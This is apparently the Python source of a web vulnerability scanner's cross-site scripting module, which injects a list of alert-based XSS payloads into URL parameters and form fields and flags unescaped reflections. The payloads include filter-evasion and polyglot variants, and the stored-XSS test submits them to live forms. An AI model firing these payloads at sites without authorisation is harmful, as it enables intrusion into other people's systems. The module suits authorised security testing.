"""
AbyssForge XSS Detection Module
Detects Reflected, Stored, and DOM-based Cross-Site Scripting vulnerabilities.
"""

import re
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from abyssforge.core.request import RequestHandler
from abyssforge.modules.base import BaseModule, Finding
from abyssforge.utils.helpers import get_url_params, inject_param
from abyssforge.utils.logger import get_logger

logger = get_logger("abyssforge.module.xss")


class XSSDetector(BaseModule):
    """
    XSS Vulnerability Detection Module.
    Tests for Reflected XSS, Stored XSS, and DOM-based XSS.
    """

    MODULE_NAME = "xss"
    VULN_TYPE = "Cross-Site Scripting (XSS)"
    SEVERITY = "high"
    CWE = "CWE-79"
    DESCRIPTION = (
        "Cross-Site Scripting allows attackers to inject malicious scripts into web pages "
        "viewed by other users, potentially stealing session tokens or credentials."
    )
    REMEDIATION = (
        "Encode output based on context (HTML, JavaScript, CSS, URL). "
        "Use Content-Security-Policy headers. "
        "Validate and sanitize all user input."
    )

    # Payloads ordered by likelihood of success / WAF evasion
    REFLECTED_PAYLOADS = [
        # Basic probes
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        # Attribute injection
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        # HTML5 events
        '<details/open/ontoggle=alert(1)>',
        '<video src=1 onerror=alert(1)>',
        '<audio src=1 onerror=alert(1)>',
        '<body onload=alert(1)>',
        # Filter evasion
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<svg><script>alert(1)</script>',
        # JavaScript context
        '";alert(1)//',
        "';alert(1)//",
        '</script><script>alert(1)</script>',
        # Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//",
    ]

    # DOM sinks to look for
    DOM_SINKS = [
        r"document\.write\s*\(",
        r"document\.writeln\s*\(",
        r"\.innerHTML\s*=",
        r"\.outerHTML\s*=",
        r"eval\s*\(",
        r"setTimeout\s*\(",
        r"setInterval\s*\(",
        r"location\.href\s*=",
        r"location\.assign\s*\(",
        r"location\.replace\s*\(",
    ]

    # DOM sources to look for
    DOM_SOURCES = [
        r"location\.hash",
        r"location\.search",
        r"location\.href",
        r"document\.referrer",
        r"window\.name",
        r"document\.cookie",
    ]

    def __init__(
        self,
        request_handler: RequestHandler,
        config: Optional[Dict[str, Any]] = None,
    ) -> None:
        super().__init__(request_handler, config)
        self.max_payloads = self.config.get("max_payloads", 30)

    def scan(self, url: str, **kwargs: Any) -> List[Finding]:
        """
        Scan for XSS vulnerabilities.

        Args:
            url: Target URL

        Returns:
            List of XSS findings
        """
        self.findings = []
        params = get_url_params(url)

        if not params:
            logger.debug(f"No URL parameters to test for XSS: {url}")
            # Still check DOM XSS even without parameters
            if self.config.get("dom_based", True):
                self._test_dom_xss(url)
            return self.findings

        logger.info(f"Testing {len(params)} parameters for XSS: {url}")

        for param_name in params:
            if self.config.get("reflected", True):
                self._test_reflected(url, param_name)

        if self.config.get("dom_based", True):
            self._test_dom_xss(url)

        return self.findings

    def _test_reflected(self, url: str, param: str) -> None:
        """Test for reflected XSS in URL parameters."""
        # Use unique marker to detect reflection
        marker = f"ABYSS{uuid.uuid4().hex[:8]}FORGE"

        # First test if input is reflected
        probe_url = inject_param(url, param, marker)
        try:
            response = self.request_handler.get(probe_url)
            if marker not in response.text:
                logger.debug(f"Input not reflected for param '{param}' - skipping XSS test")
                return
        except Exception:
            return

        # Input is reflected, try XSS payloads
        payloads = self.REFLECTED_PAYLOADS[:self.max_payloads]

        for payload in payloads:
            try:
                test_url = inject_param(url, param, payload)
                response = self.request_handler.get(test_url)

                # Check if payload appears unescaped in response
                if self._is_payload_unescaped(payload, response.text):
                    # Determine context
                    context = self._detect_context(response.text, payload)

                    self.add_finding(
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=self._extract_evidence(response.text, payload),
                        severity="high",
                        confidence="high" if "<script>" in payload.lower() else "medium",
                        extra_info={"context": context, "response_code": response.status_code},
                    )
                    return  # Found XSS in this param, move on

            except Exception as e:
                logger.debug(f"Error testing XSS payload {payload[:30]}: {e}")

    def _test_stored(self, url: str, forms: List[Dict[str, Any]]) -> None:
        """
        Test for stored XSS via form submissions.

        Args:
            url: Target URL
            forms: List of form data dictionaries
        """
        marker_base = f"ABYSS{uuid.uuid4().hex[:6]}FORGE"

        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "GET").upper()

            for inp in form.get("inputs", []):
                if inp["type"] in ("hidden", "submit", "button", "reset", "file"):
                    continue

                marker = f"{marker_base}{inp['name']}"
                payload = f'<img src=x onerror=alert("{marker}")>'

                # Build form data
                form_data = {i["name"]: i["value"] for i in form["inputs"]}
                form_data[inp["name"]] = payload

                try:
                    if method == "POST":
                        self.request_handler.post(action, data=form_data)
                    else:
                        self.request_handler.get(action, params=form_data)

                    # Check if payload appears on the page after submission
                    response = self.request_handler.get(url)
                    if marker in response.text or payload in response.text:
                        self.add_finding(
                            url=action,
                            parameter=inp["name"],
                            payload=payload,
                            evidence=f"Stored XSS marker '{marker}' found in response",
                            severity="high",
                            confidence="high",
                            request_method=method,
                            extra_info={"form_action": action, "input_type": inp["type"]},
                        )

                except Exception as e:
                    logger.debug(f"Error testing stored XSS: {e}")

    def _test_dom_xss(self, url: str) -> None:
        """Analyze page JavaScript for DOM-based XSS patterns."""
        try:
            response = self.request_handler.get(url)
            scripts = self._extract_scripts(response.text)

            for script in scripts:
                sinks = []
                sources = []

                for sink_pattern in self.DOM_SINKS:
                    if re.search(sink_pattern, script, re.IGNORECASE):
                        sinks.append(sink_pattern.split(r"\.")[0].strip(r"\s*("))

                for source_pattern in self.DOM_SOURCES:
                    if re.search(source_pattern, script, re.IGNORECASE):
                        sources.append(source_pattern)

                # If we find both a source and a sink, potential DOM XSS
                if sinks and sources:
                    self.add_finding(
                        url=url,
                        parameter="DOM",
                        payload="[DOM Analysis]",
                        evidence=f"Potential DOM XSS: Sources={sources}, Sinks={sinks}",
                        severity="medium",
                        confidence="low",
                        vuln_type="DOM-based XSS",
                        extra_info={"sinks": sinks, "sources": sources},
                    )

        except Exception as e:
            logger.debug(f"Error analyzing DOM XSS: {e}")

    def add_finding(self, url, parameter, payload, evidence, severity=None,
                    confidence="medium", request_method="GET", extra_info=None,
                    vuln_type=None):
        """Override to allow custom vuln_type."""
        finding = Finding(
            vuln_type=vuln_type or self.VULN_TYPE,
            url=url,
            parameter=parameter,
            payload=payload,
            severity=severity or self.SEVERITY,
            evidence=evidence,
            description=self.DESCRIPTION,
            remediation=self.REMEDIATION,
            cwe=self.CWE,
            confidence=confidence,
            request_method=request_method,
            extra_info=extra_info or {},
        )
        self.findings.append(finding)
        self.logger.warning(
            f"[{finding.severity.upper()}] {finding.vuln_type} at {url} | "
            f"Param: {parameter}"
        )
        return finding

    def _is_payload_unescaped(self, payload: str, response_text: str) -> bool:
        """Check if XSS payload appears unescaped in response."""
        # Check direct reflection
        if payload in response_text:
            return True

        # Check for key payload indicators
        dangerous_patterns = [
            r"<script[^>]*>",
            r"onerror\s*=",
            r"onload\s*=",
            r"javascript\s*:",
            r"alert\s*\(",
        ]

        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True

        return False

    def _detect_context(self, response_text: str, payload: str) -> str:
        """Detect the injection context (HTML, attribute, JavaScript, etc.)."""
        idx = response_text.find(payload)
        if idx == -1:
            return "unknown"

        # Look at surrounding content
        before = response_text[max(0, idx - 50):idx]

        if before.endswith('"') or before.endswith("'"):
            return "html_attribute"
        elif "<script" in before.lower():
            return "javascript"
        elif "<!--" in before:
            return "html_comment"
        else:
            return "html_body"

    def _extract_evidence(self, response_text: str, payload: str, context_chars: int = 100) -> str:
        """Extract surrounding context as evidence."""
        idx = response_text.find(payload)
        if idx == -1:
            return f"Payload detected in response (position unknown)"

        start = max(0, idx - 30)
        end = min(len(response_text), idx + len(payload) + 30)
        return f"...{response_text[start:end]}..."

    def _extract_scripts(self, html: str) -> List[str]:
        """Extract JavaScript code from HTML."""
        scripts = []
        pattern = re.compile(r"<script[^>]*>(.*?)</script>", re.DOTALL | re.IGNORECASE)
        for match in pattern.finditer(html):
            scripts.append(match.group(1))
        return scripts
